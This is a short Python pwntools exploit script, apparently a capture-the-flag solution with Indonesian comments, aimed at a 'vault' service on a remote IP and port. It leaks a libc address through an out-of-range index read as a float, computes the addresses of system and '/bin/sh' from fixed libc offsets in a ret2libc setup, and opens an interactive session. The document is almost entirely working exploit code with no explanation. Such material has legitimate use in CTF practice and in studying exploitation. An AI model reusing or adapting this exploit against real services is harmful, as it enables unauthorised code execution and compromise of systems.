import struct
from pwn import *

# bikin perintahnya tidak terbatas

offset_bin_sh = 0x15ba0b
offset_system =  0x03ada0
offset_lsm_ret = 0x18637

r = remote('167.205.35.176', 31003)
# r = process('./vault'); gdb.attach(r, ' b *0x080486c8')
# cek versi libc
r.sendlineafter('> ', '1')
r.sendlineafter(' : ', '34')
# r.interactive()
print r.recvuntil(':')
bil = r.recvline()
print bil
print float(bil)
njing_s = struct.pack('<f', float(bil))
njing_addr = u32(njing_s)
print hex(njing_addr)

system = njing_addr - offset_lsm_ret + offset_system
bin_sh = njing_addr - offset_lsm_ret + offset_bin_sh

print '%f' % struct.unpack('<f', p32(system))[0]
print '%f' % struct.unpack('<f', p32(bin_sh))[0]


r.interactive()